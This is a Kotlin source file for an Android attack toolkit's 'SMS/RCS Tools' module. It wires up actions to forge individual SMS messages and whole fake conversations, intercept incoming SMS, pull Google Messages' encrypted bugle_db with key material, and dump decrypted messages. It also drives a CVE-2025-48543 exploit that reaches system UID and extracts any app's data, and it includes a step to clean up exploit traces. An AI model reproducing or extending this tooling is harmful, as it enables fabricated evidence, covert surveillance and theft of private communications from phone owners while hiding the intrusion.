package com.darkhal.archon.messaging

import android.content.Context
import android.os.Environment
import android.util.Log
import com.darkhal.archon.module.ArchonModule
import com.darkhal.archon.module.ModuleAction
import com.darkhal.archon.module.ModuleResult
import com.darkhal.archon.module.ModuleStatus
import com.darkhal.archon.util.PrivilegeManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * SMS/RCS Tools module — message spoofing, extraction, and RCS exploitation.
 *
 * Provides actions for:
 * - Setting/restoring default SMS app role
 * - Exporting all messages or specific threads
 * - Forging (inserting fake) messages and conversations
 * - Searching message content
 * - Checking RCS status and capabilities
 * - Shizuku integration status
 * - SMS interception toggle
 *
 * All elevated operations route through ShizukuManager (which itself
 * falls back to PrivilegeManager's escalation chain).
 */
class MessagingModule : ArchonModule {

    companion object {
        private const val TAG = "MessagingModule"
    }

    override val id = "messaging"
    override val name = "SMS/RCS Tools"
    override val description = "Message spoofing, extraction, and RCS exploitation"
    override val version = "1.0"

    override fun getActions(): List<ModuleAction> = listOf(
        ModuleAction(
            id = "become_default",
            name = "Become Default SMS",
            description = "Set Archon as default SMS app (via Shizuku or role request)",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "restore_default",
            name = "Restore Default SMS",
            description = "Restore previous default SMS app",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "export_all",
            name = "Export All Messages",
            description = "Export all SMS/MMS to XML backup file",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "export_thread",
            name = "Export Thread",
            description = "Export specific conversation (use export_thread:<threadId>)",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "forge_message",
            name = "Forge Message",
            description = "Insert a fake message (use forge_message:<address>:<body>:<type>)",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "forge_conversation",
            name = "Forge Conversation",
            description = "Create entire fake conversation (use forge_conversation:<address>)",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "search_messages",
            name = "Search Messages",
            description = "Search all messages by keyword (use search_messages:<query>)",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "rcs_status",
            name = "RCS Status",
            description = "Check RCS availability and capabilities",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "shizuku_status",
            name = "Shizuku Status",
            description = "Check Shizuku integration status and privilege level",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "intercept_mode",
            name = "Intercept Mode",
            description = "Toggle SMS interception (intercept_mode:on or intercept_mode:off)",
            privilegeRequired = true,
            rootOnly = false
        ),
        ModuleAction(
            id = "rcs_account",
            name = "RCS Account Info",
            description = "Get Google Messages RCS registration, IMS state, and carrier config",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "extract_bugle_db",
            name = "Extract bugle_db",
            description = "Extract encrypted bugle_db + encryption key material from Google Messages",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "dump_decrypted",
            name = "Dump Decrypted Messages",
            description = "Query decrypted RCS/SMS messages from content providers and app context",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "extract_keys",
            name = "Extract Encryption Keys",
            description = "Extract bugle_db encryption key material from shared_prefs",
            privilegeRequired = true
        ),
        ModuleAction(
            id = "gmsg_info",
            name = "Google Messages Info",
            description = "Get Google Messages version, UID, and RCS configuration",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "check_vuln",
            name = "Check CVE-2025-48543",
            description = "Check if device is vulnerable to ART UAF → system UID exploit",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "exploit_rcs",
            name = "Exploit → Extract RCS",
            description = "CVE-2025-48543: achieve system UID, extract bugle_db + keys (locked BL ok)",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "exploit_app",
            name = "Exploit → Extract App Data",
            description = "CVE-2025-48543: extract any app's data (exploit_app:<package>)",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "exploit_status",
            name = "Extraction Status",
            description = "Check what's been extracted so far",
            privilegeRequired = false
        ),
        ModuleAction(
            id = "exploit_cleanup",
            name = "Cleanup Exploit Traces",
            description = "Remove all exploit artifacts and extracted data from device",
            privilegeRequired = false
        )
    )

    override fun executeAction(actionId: String, context: Context): ModuleResult {
        val repo = MessagingRepository(context)
        val shizuku = ShizukuManager(context)

        return when {
            actionId == "become_default" -> becomeDefault(shizuku)
            actionId == "restore_default" -> restoreDefault(shizuku)
            actionId == "export_all" -> exportAll(context, repo)
            actionId == "export_thread" -> ModuleResult(false, "Specify thread: export_thread:<threadId>")
            actionId.startsWith("export_thread:") -> {
                val threadId = actionId.substringAfter(":").toLongOrNull()
                    ?: return ModuleResult(false, "Invalid thread ID")
                exportThread(context, repo, threadId)
            }
            actionId == "forge_message" -> ModuleResult(false, "Usage: forge_message:<address>:<body>:<type 1=recv 2=sent>")
            actionId.startsWith("forge_message:") -> {
                val params = actionId.removePrefix("forge_message:").split(":", limit = 3)
                if (params.size < 3) return ModuleResult(false, "Usage: forge_message:<address>:<body>:<type>")
                val type = params[2].toIntOrNull() ?: 1
                forgeMessage(repo, params[0], params[1], type)
            }
            actionId == "forge_conversation" -> ModuleResult(false, "Specify address: forge_conversation:<phone>")
            actionId.startsWith("forge_conversation:") -> {
                val address = actionId.substringAfter(":")
                forgeConversation(repo, address)
            }
            actionId == "search_messages" -> ModuleResult(false, "Specify query: search_messages:<keyword>")
            actionId.startsWith("search_messages:") -> {
                val query = actionId.substringAfter(":")
                searchMessages(repo, query)
            }
            actionId == "rcs_status" -> rcsStatus(context, repo, shizuku)
            actionId == "shizuku_status" -> shizukuStatus(shizuku)
            actionId == "intercept_mode" -> ModuleResult(false, "Specify: intercept_mode:on or intercept_mode:off")
            actionId == "intercept_mode:on" -> interceptMode(shizuku, true)
            actionId == "intercept_mode:off" -> interceptMode(shizuku, false)
            actionId == "rcs_account" -> rcsAccountInfo(shizuku)
            actionId == "extract_bugle_db" -> extractBugleDb(shizuku)
            actionId == "dump_decrypted" -> dumpDecrypted(shizuku)
            actionId == "extract_keys" -> extractKeys(shizuku)
            actionId == "gmsg_info" -> gmsgInfo(shizuku)
            actionId == "check_vuln" -> checkVuln(context)
            actionId == "exploit_rcs" -> exploitRcs(context)
            actionId.startsWith("exploit_app:") -> exploitApp(context, actionId.substringAfter(":"))
            actionId == "exploit_app" -> ModuleResult(false, "Usage: exploit_app:<package.name>")
            actionId == "exploit_status" -> exploitStatus(context)
            actionId == "exploit_cleanup" -> exploitCleanup(context)
            else -> ModuleResult(false, "Unknown action: $actionId")
        }
    }

    override fun getStatus(context: Context): ModuleStatus {
        val shizuku = ShizukuManager(context)
        val shizukuReady = shizuku.isReady()
        val privilegeReady = PrivilegeManager.isReady()

        val summary = when {
            shizukuReady -> "Ready (elevated access)"
            privilegeReady -> "Ready (basic access)"
            else -> "No privilege access — run Setup"
        }

        return ModuleStatus(
            active = shizukuReady || privilegeReady,
            summary = summary,
            details = mapOf(
                "shizuku" to shizuku.getStatus().label,
                "privilege" to PrivilegeManager.getAvailableMethod().label
            )
        )
    }

    // ── Action implementations ─────────────────────────────────────

    private fun becomeDefault(shizuku: ShizukuManager): ModuleResult {
        if (!shizuku.isReady()) {
            return ModuleResult(false, "Elevated access required — start Archon Server or Shizuku first")
        }

        val success = shizuku.setDefaultSmsApp()
        return if (success) {
            ModuleResult(true, "Archon is now the default SMS app — can write to SMS database",
                listOf("Previous default saved for restoration",
                    "Use 'Restore Default' when done"))
        } else {
            ModuleResult(false, "Failed to set default SMS app — check Shizuku/ADB permissions")
        }
    }

    private fun restoreDefault(shizuku: ShizukuManager): ModuleResult {
        val success = shizuku.revokeDefaultSmsApp()
        return if (success) {
            ModuleResult(true, "Default SMS app restored")
        } else {
            ModuleResult(false, "Failed to restore default SMS app")
        }
    }

    private fun exportAll(context: Context, repo: MessagingRepository): ModuleResult {
        return try {
            val xml = repo.exportAllMessages("xml")
            if (xml.isBlank()) {
                return ModuleResult(false, "No messages to export (check SMS permission)")
            }

            // Write to file
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val exportDir = File(context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS), "sms_export")
            exportDir.mkdirs()
            val file = File(exportDir, "sms_backup_$timestamp.xml")
            file.writeText(xml)

            val lineCount = xml.lines().size
            ModuleResult(true, "Exported $lineCount lines to ${file.absolutePath}",
                listOf("Format: SMS Backup & Restore compatible XML",
                    "Path: ${file.absolutePath}",
                    "Size: ${file.length() / 1024}KB"))
        } catch (e: Exception) {
            Log.e(TAG, "Export failed", e)
            ModuleResult(false, "Export failed: ${e.message}")
        }
    }

    private fun exportThread(context: Context, repo: MessagingRepository, threadId: Long): ModuleResult {
        return try {
            val xml = repo.exportConversation(threadId, "xml")
            if (xml.isBlank()) {
                return ModuleResult(false, "No messages in thread $threadId or no permission")
            }

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val exportDir = File(context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS), "sms_export")
            exportDir.mkdirs()
            val file = File(exportDir, "thread_${threadId}_$timestamp.xml")
            file.writeText(xml)

            ModuleResult(true, "Exported thread $threadId to ${file.name}",
                listOf("Path: ${file.absolutePath}", "Size: ${file.length() / 1024}KB"))
        } catch (e: Exception) {
            ModuleResult(false, "Thread export failed: ${e.message}")
        }
    }

    private fun forgeMessage(repo: MessagingRepository, address: String, body: String, type: Int): ModuleResult {
        val id = repo.forgeMessage(
            address = address,
            body = body,
            type = type,
            date = System.currentTimeMillis(),
            read = true
        )

        return if (id >= 0) {
            val direction = if (type == 1) "received" else "sent"
            ModuleResult(true, "Forged $direction message id=$id",
                listOf("Address: $address", "Body: ${body.take(50)}", "Type: $direction"))
        } else {
            ModuleResult(false, "Forge failed — is Archon the default SMS app? Use 'Become Default' first")
        }
    }

    private fun forgeConversation(repo: MessagingRepository, address: String): ModuleResult {
        // Create a sample conversation with back-and-forth messages
        val messages = listOf(
            "Hey, are you there?" to MessagingRepository.MESSAGE_TYPE_RECEIVED,
            "Yeah, what's up?" to MessagingRepository.MESSAGE_TYPE_SENT,
            "Can you meet me later?" to MessagingRepository.MESSAGE_TYPE_RECEIVED,
            "Sure, what time?" to MessagingRepository.MESSAGE_TYPE_SENT,
            "Around 7pm at the usual place" to MessagingRepository.MESSAGE_TYPE_RECEIVED,
            "Sounds good, see you then" to MessagingRepository.MESSAGE_TYPE_SENT,
        )

        val threadId = repo.forgeConversation(address, messages)
        return if (threadId >= 0) {
            ModuleResult(true, "Forged conversation thread=$threadId with ${messages.size} messages",
                listOf("Address: $address", "Messages: ${messages.size}", "Thread ID: $threadId"))
        } else {
            ModuleResult(false, "Forge conversation failed — is Archon the default SMS app?")
        }
    }

    private fun searchMessages(repo: MessagingRepository, query: String): ModuleResult {
        val results = repo.searchMessages(query)
        if (results.isEmpty()) {
            return ModuleResult(true, "No messages matching '$query'")
        }

        val details = results.take(20).map { msg ->
            val direction = if (msg.type == 1) "recv" else "sent"
            val dateStr = SimpleDateFormat("MM/dd HH:mm", Locale.US).format(Date(msg.date))
            "[$direction] ${msg.address} ($dateStr): ${msg.body.take(60)}"
        }

        val extra = if (results.size > 20) {
            listOf("... and ${results.size - 20} more results")
        } else {
            emptyList()
        }

        return ModuleResult(true, "${results.size} message(s) matching '$query'",
            details + extra)
    }

    private fun rcsStatus(context: Context, repo: MessagingRepository, shizuku: ShizukuManager): ModuleResult {
        val details = mutableListOf<String>()

        // Check RCS availability
        val rcsAvailable = repo.isRcsAvailable()
        details.add("RCS available: $rcsAvailable")

        if (rcsAvailable) {
            details.add("Provider: Google Messages")
        } else {
            details.add("RCS not detected — Google Messages may not be installed or RCS not enabled")
        }

        // Check if we can access RCS provider
        if (shizuku.isReady()) {
            val canAccess = shizuku.accessRcsProvider()
            details.add("RCS provider access: $canAccess")

            if (canAccess) {
                val rcsMessages = shizuku.readRcsDatabase()
                details.add("RCS messages readable: ${rcsMessages.size}")
            }
        } else {
            details.add("Elevated access needed for full RCS access")
        }

        return ModuleResult(true,
            if (rcsAvailable) "RCS available" else "RCS not detected",
            details)
    }

    private fun shizukuStatus(shizuku: ShizukuManager): ModuleResult {
        val status = shizuku.getStatus()
        val privilegeMethod = PrivilegeManager.getAvailableMethod()

        val details = listOf(
            "Shizuku status: ${status.label}",
            "Privilege method: ${privilegeMethod.label}",
            "Elevated ready: ${shizuku.isReady()}",
            "Can write SMS DB: ${status == ShizukuManager.ShizukuStatus.READY}",
            "Can access RCS: ${status == ShizukuManager.ShizukuStatus.READY}"
        )

        return ModuleResult(true, status.label, details)
    }

    private fun interceptMode(shizuku: ShizukuManager, enable: Boolean): ModuleResult {
        if (!shizuku.isReady()) {
            return ModuleResult(false, "Elevated access required for interception")
        }

        val success = shizuku.interceptSms(enable)
        return if (success) {
            val state = if (enable) "ENABLED" else "DISABLED"
            ModuleResult(true, "SMS interception $state",
                listOf(if (enable) {
                    "Archon is now the default SMS handler — all incoming messages will be captured"
                } else {
                    "Previous SMS handler restored"
                }))
        } else {
            ModuleResult(false, "Failed to ${if (enable) "enable" else "disable"} interception")
        }
    }

    // ── Google Messages RCS database access ─────────────────────────

    private fun rcsAccountInfo(shizuku: ShizukuManager): ModuleResult {
        if (!shizuku.isReady()) {
            return ModuleResult(false, "Elevated access required")
        }
        return try {
            val info = shizuku.getRcsAccountInfo()
            val details = mutableListOf<String>()
            details.add("IMS registered: ${info["ims_registered"] ?: "unknown"}")
            details.add("RCS enabled: ${info["rcs_enabled"] ?: "unknown"}")
            val gmsg = info["google_messages"] as? Map<*, *>
            if (gmsg != null) {
                details.add("Google Messages: v${gmsg["version"] ?: "?"} (UID: ${gmsg["uid"] ?: "?"})")
            }
            val rcsConfig = info["carrier_rcs_config"] as? Map<*, *>
            if (rcsConfig != null && rcsConfig.isNotEmpty()) {
                details.add("Carrier RCS keys: ${rcsConfig.size}")
                rcsConfig.entries.take(5).forEach { (k, v) ->
                    details.add("  $k = $v")
                }
            }
            val gmsgPrefs = info["gmsg_rcs_prefs"] as? Map<*, *>
            if (gmsgPrefs != null && gmsgPrefs.isNotEmpty()) {
                details.add("Google Messages RCS prefs: ${gmsgPrefs.size}")
                gmsgPrefs.entries.take(5).forEach { (k, v) ->
                    details.add("  $k = $v")
                }
            }
            ModuleResult(true, "RCS account info retrieved", details)
        } catch (e: Exception) {
            ModuleResult(false, "Failed: ${e.message}")
        }
    }

    private fun extractBugleDb(shizuku: ShizukuManager): ModuleResult {
        if (!shizuku.isReady()) {
            return ModuleResult(false, "Elevated access required — bugle_db is encrypted at rest")
        }
        return try {
            val result = shizuku.extractBugleDbRaw()
            val dbFiles = result["db_files"] as? List<*> ?: emptyList<String>()
            val details = mutableListOf<String>()
            details.add("Database files: ${dbFiles.joinToString(", ")}")
            details.add("Staging dir: ${result["staging_dir"]}")
            details.add("ENCRYPTED: ${result["encrypted"]}")
            details.add(result["note"].toString())
            details.add("")
            details.add("Use AUTARCH web UI to pull from: ${result["staging_dir"]}")
            details.add("Key material in shared_prefs/ may enable offline decryption")
            details.add("Hardware-backed Keystore keys cannot be extracted via ADB")
            ModuleResult(dbFiles.isNotEmpty(), "Extracted ${dbFiles.size} DB files + key material", details)
        } catch (e: Exception) {
            ModuleResult(false, "Extract failed: ${e.message}")
        }
    }

    private fun dumpDecrypted(shizuku: ShizukuManager): ModuleResult {
        if (!shizuku.isReady()) {
            return ModuleResult(false, "Elevated access required")
        }
        return try {
            val result = shizuku.dumpDecryptedMessages()
            val count = result["message_count"] as? Int ?: 0
            val details = mutableListOf<String>()
            details.add("Messages retrieved: $count")
            details.add("RCS provider accessible: ${result["rcs_provider_accessible"]}")
            if (result["json_path"] != null) {
                details.add("JSON dump: ${result["json_path"]}")
            }
            details.add(result["note"].toString())
            if (count > 0) {
                details.add("")
                details.add("Use AUTARCH web UI to pull the decrypted dump")
            }
            ModuleResult(count > 0, "$count messages dumped (decrypted)", details)
        } catch (e: Exception) {
            ModuleResult(false, "Dump failed: ${e.message}")
        }
    }

    private fun extractKeys(shizuku: ShizukuManager): ModuleResult {
        if (!shizuku.isReady()) {
            return ModuleResult(false, "Elevated access required")
        }
        return try {
            val result = shizuku.extractEncryptionKeyMaterial()
            if (result.containsKey("error")) {
                return ModuleResult(false, result["error"].toString())
            }
            val details = mutableListOf<String>()
            val cryptoCount = result["crypto_prefs_count"] as? Int ?: 0
            details.add("Crypto-related shared_prefs files: $cryptoCount")
            val prefFiles = result["shared_prefs_files"] as? List<*>
            if (prefFiles != null) {
                details.add("Total shared_prefs files: ${prefFiles.size}")
            }
            val filesDir = result["files_dir"] as? List<*>
            if (filesDir != null) {
                details.add("Files dir entries: ${filesDir.size}")
            }
            details.add("")
            details.add("NOTE: bugle_db encryption key may be in these files.")
            details.add("Hardware-backed Android Keystore keys cannot be extracted.")
            details.add("If key derivation params are in shared_prefs, offline")
            details.add("decryption may be possible with the right tools.")
            ModuleResult(cryptoCount > 0, "Extracted $cryptoCount crypto-related files", details)
        } catch (e: Exception) {
            ModuleResult(false, "Key extraction failed: ${e.message}")
        }
    }

    private fun gmsgInfo(shizuku: ShizukuManager): ModuleResult {
        return try {
            val info = shizuku.getGoogleMessagesInfo()
            if (info.isEmpty()) {
                return ModuleResult(false, "Google Messages not found or not accessible")
            }
            val details = info.map { (k, v) -> "$k: $v" }
            ModuleResult(true, "Google Messages v${info["version"] ?: "?"}", details)
        } catch (e: Exception) {
            ModuleResult(false, "Failed: ${e.message}")
        }
    }

    // ── CVE-2025-48543 Exploit ──────────────────────────────────────

    private fun checkVuln(context: Context): ModuleResult {
        val exploit = ExploitManager(context)
        val check = exploit.checkVulnerability()
        val hasBinary = exploit.hasExploitBinary()
        val details = listOf(
            "SDK: ${check.sdk}",
            "Patch: ${check.patchLevel}",
            "Vulnerable: ${check.vulnerable}",
            "Exploit binary: ${if (hasBinary) "AVAILABLE" else "NOT FOUND"}",
            check.reason
        )
        return ModuleResult(true,
            if (check.vulnerable) "VULNERABLE to CVE-2025-48543" else "NOT vulnerable",
            details)
    }

    private fun exploitRcs(context: Context): ModuleResult {
        val exploit = ExploitManager(context)
        val check = exploit.checkVulnerability()
        if (!check.vulnerable) {
            return ModuleResult(false, "Device not vulnerable: ${check.reason}")
        }

        val result = exploit.extractRcsDatabase()
        val details = result.details.toMutableList()
        if (result.success) {
            details.add("")
            details.add("Pull extracted data:")
            details.add("  adb pull ${result.outputDir}/ ./extracted_rcs/")
            if (result.extractedFiles.isNotEmpty()) {
                details.add("")
                details.add("Files (${result.extractedFiles.size}):")
                result.extractedFiles.take(20).forEach { details.add("  $it") }
            }
        }
        return ModuleResult(result.success,
            if (result.success) "RCS database extracted via ${result.method}" else "Failed: ${result.error}",
            details)
    }

    private fun exploitApp(context: Context, packageName: String): ModuleResult {
        val exploit = ExploitManager(context)
        val result = exploit.extractAppData(packageName)
        return ModuleResult(result.success,
            if (result.success) "App data extracted: $packageName" else "Failed: ${result.error}",
            result.details)
    }

    private fun exploitStatus(context: Context): ModuleResult {
        val exploit = ExploitManager(context)
        val status = exploit.getExtractionStatus()
        val details = mutableListOf<String>()
        details.add("Extracted: ${status["extracted"]}")
        if (status["extracted"] == true) {
            details.add("Output: ${status["output_dir"]}")
            details.add("Has bugle_db: ${status["has_bugle_db"]}")
            if (status["bugle_db_size"] != null) {
                details.add("bugle_db size: ${(status["bugle_db_size"] as Long) / 1024}KB")
            }
            details.add("shared_prefs: ${status["shared_prefs_count"]} files")
            val files = status["files"] as? List<*>
            if (files != null) {
                details.add("Total files: ${files.size}")
            }
            if (status["device_info"] != null) {
                details.add("")
                details.add(status["device_info"].toString())
            }
        }
        return ModuleResult(true, "Extraction status", details)
    }

    private fun exploitCleanup(context: Context): ModuleResult {
        val exploit = ExploitManager(context)
        val cleaned = exploit.cleanup()
        return ModuleResult(true, "Cleanup complete", cleaned)
    }
}
